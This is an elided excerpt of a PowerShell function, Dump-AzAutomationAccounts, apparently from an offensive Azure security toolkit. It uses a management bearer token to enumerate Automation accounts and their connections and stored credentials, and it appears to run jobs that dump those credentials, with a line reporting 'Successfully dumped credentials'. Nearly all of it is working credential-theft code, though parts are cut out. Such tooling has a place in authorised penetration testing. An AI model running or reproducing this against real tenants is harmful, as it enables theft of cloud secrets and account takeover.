function Dump-AzAutomationAccounts {
[CmdletBinding()]
    Param(
    ...
    #Write-Verbose $automationAccounts
    ...
    foreach($account in $automationAccounts)
    {
        ...
        $connections = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$account.id.split("/")[4],"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/connections?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content | ConvertFrom-Json).value
        #Write-Verbose $connections
        foreach($conn in $connections){

            $connection = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$account.id.split("/")[4],"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/connections/",$conn.name,"?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content)
            ...
            Write-Verbose $properties.properties.fieldDefinitionValues
            #Write-Verbose (($connection | ConvertFrom-Json) | Select-Object -Property properties)
        ...
        $credentials = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$account.id.split("/")[4],"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/credentials?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content | ConvertFrom-Json).value


        foreach($cred in $credentials)
        {
            $cred = (Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$account.id.split("/")[4],"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/credentials/",$cred.name,"?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content
            #Write-Verbose $cred
            ...
            if ($cred -ne $null){
                ...
                foreach ($jobToRun in $jobList2){
                    ...
                    if (Test-Path $pwd\$jobToRun.ps1 -PathType Leaf){
                        #$autoCredCurrent = $cred[$autoCredIter]
                        #$autoCredCurrent = $autoCredCurrent | ConvertFrom-Json
                        ...
                        #$autoCredIter++
                            ...
                            # If there was an actual cred here, get the output and add it to the table                    
                                ...
                                #Write-Output "Successfully dumped credentials: $cred1 : $cred2"
